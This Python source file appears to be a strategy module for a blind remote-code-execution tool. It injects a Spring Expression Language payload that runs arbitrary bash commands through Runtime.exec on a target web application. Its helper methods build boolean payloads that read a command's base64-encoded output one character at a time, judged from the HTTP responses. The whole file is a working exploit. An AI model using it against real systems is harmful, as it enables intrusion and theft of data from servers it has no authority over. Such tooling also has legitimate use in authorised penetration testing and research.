import requests
from strategies.abstract_strategy import AbstractStrategy

class JavaRCEStrategy(AbstractStrategy):
    def __init__(self, url="http://localhost/"):
        self.url = url
        
    def send_payload(self, payload, timeout=10):
        try:
            params = {'vuln_param': f"${{T(Runtime).getRuntime().exec(new String[]{{\"bash\",\"-c\", \"{payload}\"}}).waitFor()}}"}
            cookies = {
                'JSESSIONID': 'XXXXXXXXX'
            }
            response = requests.get(self.url, params=params, cookies=cookies)
            response.raise_for_status()
            return response.status_code == 200
        except Exception as e:
            print(e)
            return None
    
    def create_length_check_payload(self, cmd, length):
        return f"t=$({cmd}|base64|tr -d '\n'); [ ${{#t}} -ge {length} ] || mismatch"

    def create_char_check_payload(self, cmd, position, char_value):
        return f"t=$({cmd}|base64|tr -d '\n');echo $t|cut -c{position+1}|od -An -tuC -N1 | tr -d ' '|xargs -I{{}} expr {{}} '=' {char_value}||mismatch"

    def create_char_less_than_payload(self, cmd, position, char_value):
        return f"t=$({cmd}|base64|tr -d '\n');echo $t|cut -c{position+1}|od -An -tuC -N1 | tr -d ' '|xargs -I{{}} expr {{}} '<' {char_value}||mismatch" 